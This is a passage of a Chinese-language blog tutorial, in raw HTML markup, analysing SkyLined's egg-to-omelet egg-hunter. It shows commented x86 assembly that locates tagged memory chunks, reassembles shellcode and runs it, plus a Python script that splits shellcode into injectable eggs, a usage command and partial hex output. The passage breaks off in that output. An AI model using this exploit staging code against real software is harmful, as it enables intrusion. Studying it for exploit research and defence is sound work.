class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;BITS 32 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;nr_eggs equ 0x2             ; egg内存块的数量&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;egg_size equ 0x7b           ; 每一egg内存块占127字节 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jmp short start &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;get_target_loc:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;push esp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pop edi                        ; 将栈顶指针esp保存在edi中&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;or di,0xffff                ; edi=0x....ffff，即当前栈桢的末尾&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov edx,edi                 ; edx=搜索的起始地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xor eax,eax                 ; eax清零&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov al,nr_eggs              ; eax = 内存块数量&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;calc_target_loc:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xor esi,esi                 ; esi=0，作为计数器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov si,0-(egg_size+20)      ; 为每一块egg内存块添加20字节的额外空间&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;get_target_loc_loop:        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dec edi                     ; 往回遍历搜索当前栈桢&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;inc esi                     ; 递增计数器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cmp si,-1                   ; 继续往回遍历直到ESI = -1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jnz get_target_loc_loop&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dec eax                     ; 若未找到所有的内存块则跳走并继续循环，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jnz calc_target_loc            ; 否则edi就指向了重组shellcode将保存的地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xor ebx,ebx                 ; ebx清零，作为计数器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov bl,nr_eggs+1            ; ebx = nr_eggs + 1，但为了避免出现NULL字节，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            ; 因此这里从1开始计数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ret &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;start:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;call get_target_loc         ; 计算出重组shellcode将保存的栈地址 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jmp short search_next_address&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;find_egg:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dec edx                     ; 由于下面搜索是以DWORD（4字节）为单位进行字节扫描的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dec edx                        ; 因此这里需要edx-4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dec edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dec edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;search_next_address:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;inc edx                     ; 搜索下一字节&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;push edx                    ; 保存edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;push byte +0x02&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pop eax                     ; eax = 0x02，功能号，系统调用表可参考下列网址:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            ; http://www.metasploit.com/users/opcode/syscalls.html&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int 0x2e                    ; 调用NtAccessCheckAndAuditAlarm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cmp al,0x5                  ; 判断是否访问违例（0xc0000005== ACCESS_VIOLATION)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pop edx                     ; 重储edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;je search_next_address      ; 如果地址不可读则跳走&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov eax,0x77303001          ; 若可读则将索引值与标记值赋予eax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;add eax,ebx                 ; eax += ebx,这里ebx为egg内存块的计数器，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            ; 此时eax得到的就是各个内存块开头的标记marker，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            ; tag=773030&amp;lt;seq&amp;gt;,其中seq = 0x1 +  number_of_remaining_eggs_to_find + 0x1,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            ; 比如0x77303003，0x77303004……&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xchg edi,edx                ; 交换edi与edx的值&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;scasd                       ; 搜索edi中是否存在eax中的标记&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xchg edi,edx                ; 将edi/edx的值再交换回来&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jnz find_egg                ; 若未找到相匹配的标记则跳走，否则edx指向找到的egg内存块&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;copy_egg:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov esi,edx                 ; ESI = EDX，保存egg内存块地址到esi留作后用 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xor ecx,ecx                    ; ecx = 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov cl,egg_size             ; 复制的字节数，相当于每一egg内存块大小&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rep movsb                   ; 从esi复制到edi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dec ebx                     ; 递增ebx,ebx为内存块计数器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cmp bl,1                    ; 判断是否找到所有的egg内存块&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jnz find_egg                ; 没有则继续搜索&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;done:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;call get_target_loc         ; 重新定位重组后shellcode所在的地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jmp edi                     ; 执行shellcode&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以上分析的两份程序均是对各egg内存块进行搜索的egg-to-omelet hunter程序，SkyLined还提供了另一份代码用于将shellcode进行分段，构造出各段egg内存块数据，其文件名为w32_SEH_omelet.py，是用Python编写的。它主要是遵循SkyLined在w32_SEH_omelet.asm代码中所提到的算法进行计算，以获取各块egg中的字节大小size，索引值index，标记值marker（默认为0x280876），以及各egg中的部分shellcode代码，每块egg的大小是固定的（默认为127字节），不足的用’@’（0x40）填充。其核心代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(my_name, bin_file, shellcode_file, output_file, egg_size = &lt;span class=&quot;string&quot;&gt;&#39;0x7F&#39;&lt;/span&gt;, marker_bytes = &lt;span class=&quot;string&quot;&gt;&#39;0x280876&#39;&lt;/span&gt;)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (marker_bytes.startswith(&lt;span class=&quot;string&quot;&gt;&#39;0x&#39;&lt;/span&gt;)):        &lt;span class=&quot;comment&quot;&gt;# 判断标记marker_bytes是否以0x开头&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    marker_bytes = int(marker_bytes[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;:], &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;)    &lt;span class=&quot;comment&quot;&gt;# 以16为基数（十六进制）进行整数转换&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    marker_bytes = int(marker_bytes)    &lt;span class=&quot;comment&quot;&gt;# 以10为基数（十进制）进行整数转换&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (egg_size.startswith(&lt;span class=&quot;string&quot;&gt;&#39;0x&#39;&lt;/span&gt;)):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    egg_size = int(egg_size[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;:], &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    egg_size = int(egg_size)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;assert&lt;/span&gt; marker_bytes &amp;lt;= &lt;span class=&quot;number&quot;&gt;0xFFFFFF&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;Marker must fit into 3 bytes.&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;assert&lt;/span&gt; egg_size &amp;gt;= &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;Eggs cannot be less than 6 bytes.&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;assert&lt;/span&gt; egg_size &amp;lt;= &lt;span class=&quot;number&quot;&gt;0x7F&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;Eggs cannot be more than 0x7F (127) bytes.&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  bin = open(bin_file).read()            &lt;span class=&quot;comment&quot;&gt;# 读取bin_file文件,即负责搜索egg的bin文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  marker_bytes_location = ord(bin[&lt;span class=&quot;number&quot;&gt;-3&lt;/span&gt;])    &lt;span class=&quot;comment&quot;&gt;# 标记值marker&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  max_index_location = ord(bin[&lt;span class=&quot;number&quot;&gt;-2&lt;/span&gt;])        &lt;span class=&quot;comment&quot;&gt;# 索引值index&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  egg_size_location = ord(bin[&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;])        &lt;span class=&quot;comment&quot;&gt;# 各egg内存块所占的字节数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  code = bin[:&lt;span class=&quot;number&quot;&gt;-3&lt;/span&gt;]                        &lt;span class=&quot;comment&quot;&gt;# 用于存放分段后的部分shellcode代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  shellcode = open(shellcode_file).read()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  max_index = int(math.ceil(len(shellcode) / (egg_size - &lt;span class=&quot;number&quot;&gt;5.0&lt;/span&gt;)))        &lt;span class=&quot;comment&quot;&gt;# 计算出每块egg的最大索引值，并要求其必须&amp;lt;=0xFF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;assert&lt;/span&gt; max_index &amp;lt;= &lt;span class=&quot;number&quot;&gt;0xFF&lt;/span&gt;, (&lt;span class=&quot;string&quot;&gt;&#39;The shellcode would require %X (%d) eggs of  %X &#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&#39;(%d) bytes, but 0xFF (255) is the maximum number of eggs.&#39;&lt;/span&gt;) % (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      max_index, max_index, egg_size, egg_size)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  marker_bytes_string = &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    marker_bytes_string += chr(marker_bytes &amp;amp; &lt;span class=&quot;number&quot;&gt;0xFF&lt;/span&gt;)        &lt;span class=&quot;comment&quot;&gt;# 将标记值与0xFF进行与运算&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    marker_bytes &amp;gt;&amp;gt;= &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;        &lt;span class=&quot;comment&quot;&gt;# 右移8位，相当于将标记值转换成0x280876ff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  max_index_string = chr(max_index)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  egg_size_string = chr(egg_size - &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;)    &lt;span class=&quot;comment&quot;&gt;# 扣去字节大小（1字节），索引值（1字节）和标记（3字节）所占用的5字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;# insert variables into code&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  code = code[:marker_bytes_location] + marker_bytes_string + code[marker_bytes_location+&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  code = code[:max_index_location] + max_index_string + code[max_index_location+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  code = code[:egg_size_location] + egg_size_string + code[egg_size_location+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  output = [&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;// This is the binary code that needs to be executed to find the eggs, &#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;// recombine the orignal shellcode and execute it. It is %d bytes:&#39;&lt;/span&gt; % (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      len(code),),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;omelet_code = &quot;%s&quot;;&#39;&lt;/span&gt; % HexEncode(code),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;// These are the eggs that need to be injected into the target process &#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;// for the omelet shellcode to be able to recreate the original shellcode&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;// (you can insert them as many times as you want, as long as each one is&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;// inserted at least once). They are %d bytes each:&#39;&lt;/span&gt; % (egg_size,) ]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  egg_index = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; shellcode:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    egg = egg_size_string + chr(egg_index ^ &lt;span class=&quot;number&quot;&gt;0xFF&lt;/span&gt;) + marker_bytes_string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    egg += shellcode[:egg_size - &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;]        &lt;span class=&quot;comment&quot;&gt;# 构造出完整的egg内存块：size + index + marker + shellcode &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; len(egg) &amp;lt; egg_size:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;# tail end of shellcode is smaller than an egg: add pagging:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      egg += &lt;span class=&quot;string&quot;&gt;&#39;@&#39;&lt;/span&gt; * (egg_size - len(egg))    &lt;span class=&quot;comment&quot;&gt;# 每块egg的大小是固定的（默认为127字节），不足的用&#39;@&#39;（0x40）填充&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    output.append(&lt;span class=&quot;string&quot;&gt;&#39;egg%d = &quot;%s&quot;;&#39;&lt;/span&gt; % (egg_index, HexEncode(egg)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    shellcode = shellcode[egg_size - &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    egg_index += &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  open(output_file, &lt;span class=&quot;string&quot;&gt;&#39;w&#39;&lt;/span&gt;).write(&lt;span class=&quot;string&quot;&gt;&#39;\n&#39;&lt;/span&gt;.join(output))    &lt;span class=&quot;comment&quot;&gt;# 写入输出文件output_file&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;使用方法&quot;&gt;&lt;a href=&quot;#使用方法&quot; class=&quot;headerlink&quot; title=&quot;使用方法&quot;&gt;&lt;/a&gt;使用方法&lt;/h3&gt;&lt;p&gt;关于使用方法，其实很简单，使用命令如下：&lt;br&gt;C:\Users\riusksk&amp;gt; w32_SEH_omelet.py  w32_SEH_omelet.bin  shellcode.bin  output.txt  127  0xBADA55&lt;br&gt;它需要先生成两个bin文件，一个是shellcode.bin，还有一个用于egg搜索的w32_SEH_omelet.bin，这里用Peter Van Eeckhoutte编写的egg-to-omelet hunter程序来生成bin文件以代替w32_SEH_omelet.bin也是可以的。关于shellcode.bin，你可以先用metasploit先生成shellcode，然后用perl/python将shellcode写入一个bin文件即可；而w32_SEH_omelet.bin可直接用nasm去编译SkyLined的w32_SEH_omelet.asm或者Peter Van Eeckhoutte写的corelanc0d3r_omelet.asm从而得到此bin文件。Output.txt是输出文件，用来保存生成各个egg以及omelet代码，后面的127是每一块egg内存块的字节数，而0xBADA55是标记值，你也可采用其它3字节数据，比如w00(0x773030)，最后生成的输出文件内容类似如下：&lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;// This &lt;span class=&quot;keyword&quot;&gt;is&lt;/span&gt; the binary code that needs to be executed to find the eggs, &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; // recombine the orignal shellcode &lt;span class=&quot;keyword&quot;&gt;and&lt;/span&gt; execute it. It &lt;span class=&quot;keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;82&lt;/span&gt; bytes:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; omelet_code = &lt;span class=&quot;string&quot;&gt;&quot;\x31\xFF\xEB\x23\x51\x64\x89\x20\xFC\xB0 ... \xFF\x50\x08&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span 